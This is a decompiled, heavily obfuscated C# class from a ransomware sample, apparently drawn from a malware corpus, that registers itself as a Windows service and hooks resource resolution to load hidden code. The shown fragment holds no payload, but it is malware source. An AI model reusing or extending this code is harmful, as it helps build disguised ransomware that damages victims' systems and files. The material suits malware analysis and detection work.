// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႳႣ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Reflection;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Threading;

namespace Ⴃ
{
  internal sealed class ႳႣ : ServiceBase
  {
    private IContainer Ⴃ;
    private static bool Ⴐ;

    public ႳႣ() => this.Ⴗ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      byte[] ⴐ = ႷႨ.Ⴐ;
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
            num = this.Ⴃ == null ? 1 : (int) ⴐ[192] - (int) ⴐ[3];
            continue;
          case 1:
            goto label_5;
          case 3:
          case 6:
            goto label_4;
          case 4:
            goto label_6;
          default:
            num = !obj0 ? (int) ⴍ[45] : 0;
            continue;
        }
      }
label_6:
      return;
label_4:
      this.Ⴃ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴗ()
    {
      this.Ⴃ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႭႭ.Ⴈ(typeof (ႷႣ), 3L, 0, 1951761429), (short) 797, '͵');
    }

    static ႳႣ() => ႳႣ.Ⴅ();

    internal static void Ⴅ()
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      char[] ⴗ = ႷႼ.Ⴗ;
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 4:
            goto label_4;
          default:
            if (!ႳႣ.Ⴐ)
            {
              num1 = (int) ⴗ[79] - 4295;
              continue;
            }
            goto label_10;
        }
      }
label_10:
      return;
label_4:
      IReflect reflect;
      Monitor.Enter((object) (Type) (reflect = (IReflect) typeof (ႳႣ)));
      try
      {
        int num2 = 5;
        while (true)
        {
          switch (num2)
          {
            case 0:
              ႳႣ.Ⴐ = true;
              AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(ႷႥ.Ⴀ);
              goto case 2;
            case 1:
            case 3:
            case 4:
              goto label_12;
            case 2:
              num2 = (int) ⴐ[402] - 134;
              continue;
            default:
              num2 = ႳႣ.Ⴐ ? (int) ⴐ[450] / 3 : (int) ⴗ[131] - 34588;
              continue;
          }
        }
      }
      finally
      {
        Monitor.Exit((object) (Type) reflect);
      }
label_12:
      int num3 = 1;
      while (true)
      {
        switch (num3)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႣ.Ⴅ);
            num3 = 4;
            continue;
          case 2:
            goto label_16;
          case 4:
            goto label_17;
          default:
            num3 = (int) ⴗ[145] - 23977;
            continue;
        }
      }
label_16:
      return;
label_17:;
    }

    internal delegate byte ႣႷ([In] int obj0);
  }
}
